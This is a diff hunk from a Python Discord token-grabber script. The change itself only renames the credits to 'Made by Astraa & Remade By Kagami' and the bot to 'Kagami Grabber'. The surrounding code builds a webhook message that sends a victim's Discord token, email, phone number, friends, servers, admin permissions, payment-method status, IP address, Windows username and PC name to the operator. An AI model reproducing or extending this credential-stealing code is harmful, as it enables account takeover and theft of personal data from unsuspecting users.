@@ -186,14 +186,14 @@ def main():
                                 ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nFriends: {friends}\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                             'color': 3092790,
                             'footer': {
-                                'text': "Made by Astraa ・ https://github.com/astraadev"
+                                'text': "Made by Astraa & Remade By Kagami・ https://github.com/astraadev - https://github.com/Uwu-Kagami"
                             },
                             'thumbnail': {
                                 'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                             }
                         }
                     ],
-                    "username": "Grabber",
+                    "username": "Kagami Grabber",
                     "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
                 }
 
